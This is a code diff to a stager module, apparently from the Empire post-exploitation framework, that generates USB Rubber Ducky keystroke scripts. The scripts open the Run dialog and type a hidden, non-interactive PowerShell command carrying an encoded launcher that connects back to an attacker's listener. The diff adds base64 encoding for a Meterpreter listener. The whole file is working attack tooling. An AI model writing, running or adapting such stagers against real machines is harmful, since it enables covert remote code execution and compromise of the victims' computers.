@@ -1,4 +1,5 @@
 from lib.common import helpers
+ 
 
 class Stager:
 
@@ -84,7 +85,7 @@ class Stager:
 
 
     def generate(self):
-
+        
         # extract all of our options
         language = self.options['Language']['Value']
         interpreter = self.options['Interpreter']['Value']
@@ -101,13 +102,18 @@ class Stager:
             obfuscateScript = True
 
         # generate the launcher code
+        moduleName = self.mainMenu.listeners.activeListeners[listenerName]['moduleName']
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
         
         if launcher == "" or interpreter == "":
             print helpers.color("[!] Error in launcher command generation.")
             return ""
         else:
-            enc = launcher.split(" ")[-1]
+            if moduleName.lower() == 'meterpreter':
+                import base64
+                enc = base64.b64encode(launcher)
+            else:
+                enc = launcher.split(" ")[-1]
 
             duckyCode =  "DELAY 3000\n"
             duckyCode += "GUI r\n"
@@ -115,11 +121,12 @@ class Stager:
             duckyCode += "STRING "+ interpreter + "\n"
             duckyCode += "ENTER\n"
             duckyCode += "DELAY 2000\n"
+            
             if obfuscateScript and "launcher" in obfuscateCommand.lower():
                 duckyCode += "STRING "+launcher+" \n"
             else:
-                enc = launcher.split(" ")[-1]
                 duckyCode += "STRING powershell -W Hidden -nop -noni -enc "+enc+" \n"
+            
             duckyCode += "ENTER\n"
 
             return duckyCode
